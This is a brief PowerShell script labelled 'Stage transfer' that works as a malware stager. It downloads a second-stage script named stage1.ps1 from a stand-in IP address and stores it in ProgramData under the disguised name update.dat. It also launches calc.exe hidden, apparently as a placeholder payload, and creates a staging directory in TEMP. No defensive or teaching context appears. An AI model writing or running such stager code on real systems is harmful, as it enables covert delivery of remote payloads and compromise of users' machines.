<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://203.0.113.37/stage1.ps1',
    [string]$OutputPath = 'C:\ProgramData\update.dat',
    [int]$RequestTimeout = 198
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
